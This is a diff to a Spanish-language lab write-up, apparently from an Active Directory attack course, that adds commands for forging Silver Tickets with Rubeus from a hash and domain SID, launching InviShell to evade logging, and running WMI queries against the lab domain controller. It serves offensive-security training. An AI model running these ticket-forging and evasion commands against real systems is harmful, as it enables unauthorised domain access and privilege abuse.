@@ -1106,4 +1106,19 @@ dcorp-dc     92163c923f1589e39f0f8c6a369eebaf
 ```
 
 Ese hash lo podemos usar para crear un *Silver Ticket* para poder ejecutar consultas *WMI*
+```shell
+C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:host/dcorp-dc.dollarcorp.moneycorp.local /rc4:1be12164a06b817e834eb437dc8f581c /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt
+```
+
+```shell
+C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:rpcss/dcorp-dc.dollarcorp.moneycorp.local /rc4:1be12164a06b817e834eb437dc8f581c /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt
+```
+
+Ejecutamos ahora una *Invishell* y podemos ejecutar comandos *WMI*
+```shell
+C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
+```
+```shell
+gwmi -Class win32_operatingsystem -ComputerName dcorp-dc
+```
 
